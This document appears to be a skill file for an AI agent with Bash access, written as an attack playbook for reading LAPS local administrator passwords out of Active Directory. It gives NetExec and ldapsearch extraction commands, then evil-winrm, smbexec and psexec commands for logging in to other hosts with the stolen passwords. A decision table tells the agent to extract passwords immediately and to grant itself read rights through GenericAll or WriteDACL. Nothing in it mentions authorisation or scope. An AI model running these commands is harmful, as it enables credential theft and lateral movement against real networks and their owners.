---
name: laps
description: "LAPS local administrator password extraction"
allowed-tools: Bash
metadata:
  subdomain: active-directory
  mitre_attack: T1552.004
  when_to_use: "laps, local admin, ms-mcs-admpwd, ReadLAPSPassword, local administrator"
  tags: active-directory, credential-access, lateral-movement
---

# LAPS — Local Administrator Password Extraction

LAPS (Local Administrator Password Solution) stores unique local admin passwords in AD attributes. If the current user has `ReadLAPSPassword` rights on computer objects, those passwords can be read directly.

## 1. Check Access

```python
# Query KnowledgeGraph for users/groups with ReadLAPSPassword edges
kg_query(kind="user")
```

Filter results for `ReadLAPSPassword` edges to computer objects. BloodHound Cypher:
```bash
neo4j-cypher 'MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) RETURN n.name, c.name'
```

## 2. Extract Passwords

**NetExec — LAPS v1**
```bash
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -M laps
```

**NetExec — LAPS v2 (Windows LAPS)**
```bash
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -M laps --kdcHost <DC_IP>
```

**Manual LDAP query — LAPS v1**
```bash
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(ms-mcs-admpwd=*)' ms-mcs-admpwd sAMAccountName
```

**Manual LDAP query — LAPS v2**
```bash
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(msLAPS-Password=*)' msLAPS-Password sAMAccountName
```

## 3. Use Extracted Passwords

```bash
# WinRM access with LAPS password
evil-winrm -i <TARGET_IP> -u Administrator -p '<LAPS_PASS>'

# SMB access
impacket-smbexec '<TARGET_HOSTNAME>/Administrator:<LAPS_PASS>'@<TARGET_IP>

# psexec
impacket-psexec '<TARGET_HOSTNAME>/Administrator:<LAPS_PASS>'@<TARGET_IP>
```

## 4. Decision Gates

| Condition | Action |
|-----------|--------|
| ReadLAPSPassword edge found in BloodHound | Extract password immediately |
| LAPS v1 attribute empty | Check if LAPS is deployed — attribute may not be populated on all hosts |
| LAPS v2 (msLAPS-Password) present | Use `--kdcHost` flag with nxc for proper decryption |
| Password extracted | Use for lateral movement to that specific host only |
| No ReadLAPSPassword rights | Check for GenericAll/WriteDACL on computer objects — can grant yourself the right |

## Anti-Patterns
- Assuming LAPS passwords work across hosts — each computer has a unique password.
- Not checking LAPS version — v2 uses encrypted attributes that require different extraction.
- Ignoring LAPS expiration — passwords rotate; extracted passwords may expire before use.
